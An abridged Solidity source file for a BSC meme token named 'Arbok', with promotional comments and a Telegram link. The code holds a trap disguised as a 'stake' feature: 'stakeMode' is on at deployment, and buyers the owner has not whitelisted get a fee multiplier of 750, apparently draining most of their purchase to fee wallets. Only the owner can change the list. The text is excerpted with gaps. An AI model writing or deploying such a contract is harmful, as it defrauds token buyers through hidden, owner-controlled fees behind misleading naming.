...
/*
 ...
 Welcome To Arbok, The next meme coin in BSC!
 The Legend Pokemon Arbok.


 https://t.me/ArbokBSC

 #LegendPokemon #Decentralized #ARBOOOK #INVERSED #KOBRA!
...
contract Arbok is Ownable, IBEP20 {
    using SafeMath for uint256;
    ...
    bool public stakeMode = true;
    mapping (address => bool) public isstakeed;
    ...
    constructor () {
       router = IDEXRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        ...
        isstakeed[msg.sender] = true;
        isstakeed[RouterV2] = true;
        ...
        marketingFeeReceiver = 0x7232162bfbBF210b00B6452bB6f7CB5349b2C3eD;
        teamFeeReceiver = 0x06432Cf39Fc58dd582E9dEbbf46CECB20724c7D3;
    ...
    function takeFee(address sender, uint256 amount, bool isSell, address receiver) internal returns (uint256) {
        ...
        if(stakeMode && !isstakeed[receiver] && !isSell){
            multiplier = 750;
        }
    ...
    function Manage_stake(address[] calldata addresses, bool status) public onlyOwner {
        for (uint256 i; i < addresses.length; ++i) {
            isstakeed[addresses[i]] = status;
        }
    }
